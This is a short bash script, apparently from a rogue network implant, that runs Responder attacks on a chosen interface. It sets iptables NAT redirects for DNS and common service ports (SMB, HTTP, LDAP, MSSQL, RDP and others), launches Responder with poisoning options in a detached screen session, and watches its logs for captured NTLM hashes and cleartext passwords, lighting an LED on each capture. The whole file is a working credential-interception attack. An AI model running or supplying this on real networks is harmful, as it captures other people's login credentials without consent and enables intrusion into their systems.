#!/bin/bash

echo '[*] running Responder attacks'

if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q 53; then
  iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
fi

for port in 21 25 80 88 110 143 389 443 445 1433 3389
do
	if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q " $port"; then
	  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport $port -j REDIRECT --to-port $port
	fi
done

[[ $(pgrep -f bin/responder) = '' ]] && {
	screen -dmS responder responder -I "$1" -r -d -w -F
}

inotifywait -e MODIFY -rm /usr/share/responder/logs | while read event
do
 	if echo $event | grep -e NTLM -e ClearText --color=auto; then
 		led yellow on 2> /dev/null
 	fi
done